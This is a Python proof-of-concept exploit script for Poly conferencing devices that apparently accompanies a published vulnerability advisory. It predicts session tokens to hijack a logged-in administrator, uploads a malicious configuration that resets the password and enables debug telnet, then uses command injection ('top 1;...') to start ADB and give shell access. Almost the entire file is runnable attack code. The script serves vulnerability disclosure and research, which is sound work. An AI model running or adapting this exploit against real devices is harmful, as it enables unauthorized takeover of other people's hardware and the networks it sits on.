#!/usr/bin/env python3
# Requires Python < 3.13 (because telnetlib 
# Install required dependencies via: 
# pip install requests
# Connecting via adb requires an "adb" binary from the Android Platform Tools

import requests
import subprocess
import time
import re
import telnetlib
import time
import argparse

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

USER = "Polycom"
PASSWORD = "UNLOCKED" # This password must match the password in ./config.xml

# Encodes and sends a command to the telnet session 'tn"
def send_command(tn, command):
    tn.write(command.encode('ascii') + b'\n')

# Connects the host to the adb server on the device
def connect_adb(host):
    print(f"> Connecting to ADB...")
    while True:
        result = subprocess.check_output(["adb", "connect", host + ":5555"])
        adb_connection = result.decode().strip()
        print(adb_connection)
        if "connected to " in adb_connection:
            print("> ADB connected!")
            print("> You can now get a shell using `adb shell`")
            return

# Connect to the Telnet server and enable the ADB server on the device
def connect_telnet(host):
    print("> Connecting to debug telnet...")
    while True:
        try:
            tn = telnetlib.Telnet(host, 1023)
            print(f"> Entering username: {USER}")
            tn.read_until(b"User:")
            send_command(tn, USER)

            print(f"> Entering password: {PASSWORD}")
            tn.read_until(b"Password:")
            send_command(tn, PASSWORD)

            # Wait for the prompt "Admin>"
            tn.read_until(b"Admin>")

            # Test the command injection
            send_command(tn, "top 1;id")
            # If the script hangs here, the device may not be vulnerable to the command injection
            out = tn.read_until(b"Admin>").decode().replace("top 1;id\r\n", "").replace(" context=u:r:poly:s0\r\nAdmin>", "")

            print(f"> Command injection as {out}!")
            print(f"> Enabling ADB...")
            send_command(tn, "top 1;setprop service.adb.tcp.port 5555")
            tn.read_until(b"Admin>")
            send_command(tn, "top 1;stop adbd;")
            tn.read_until(b"Admin>")
            send_command(tn, "top 1;start adbd")
            tn.read_until(b"Admin>")
            break
        except Exception as e:
            print("> Error:", e)
            time.sleep(1)

# Returns the session value that would have been generated 5 seconds ago
def get_session_value(device_type="CCX"):
    epoch = str(int(time.time()) - 5)
    result = subprocess.check_output(["../bin/poc-rand", device_type, str(epoch)])
    session_value = result.decode().strip()
    return session_value

def main():
    parser = argparse.ArgumentParser(
                    description='''Proof of concept for several CVEs on Poly 
                    devices, taking over an administrator's session to enabling 
                    ADB to get a shell.

                    For more details see: https://modzero.com/en/blog/multiple-vulnerabilities-in-poly-products/
                    '''
                    )
    parser.add_argument('host')
    parser.add_argument('--device', default="CCX")
    args = parser.parse_args()
    host = args.host

    print(f"> Waiting for an admin to log in to {host}")
    base_url = f"https://{host}"
    while True:
        session_value = get_session_value(device_type=args.device)
        print(f"> Testing session token {session_value}", end="\r")

        cookies = {"session": session_value}
        try:
            response = requests.get(base_url + "/index.htm", cookies=cookies, verify=False)
            # Handle the response as needed (e.g., print response content)
            if response.status_code != 401:
                print("")
                print("> Found a valid session!")
                print("> Taking over device by uploading a malicious config...")

                csrf_token_pattern = r'<meta\s+name="csrf-token"\s+content="([^"]+)"'

                # Search for the CSRF token using the pattern
                match = re.search(csrf_token_pattern, response.text)
                csrf_token = match.group(1)

                # Upload the configuration file to change the password and enable the Telnet server
                url = base_url + "/form-submit/Utilities/configuration/importFile?anti-csrf-token=" + csrf_token
                files = {'myfile': ('file.cfg', open("config.cfg", 'rb'))}
                response = requests.post(url, cookies=cookies, files=files, verify=False)
                if "UPLOAD_SUCCESSFUL" in response.text:
                    print(f"> Password changed to '{PASSWORD}'!")
                    print("> Enabled debug telnet mode!")
                    connect_telnet(host)
                    connect_adb(host)
                else:
                    print("> Something went horribly wrong! :(")
                return
        except requests.RequestException as e:
            print(f"> Error: {e}")

        time.sleep(0.5)  # Wait for one second before making the next request

if __name__ == "__main__":
    main()
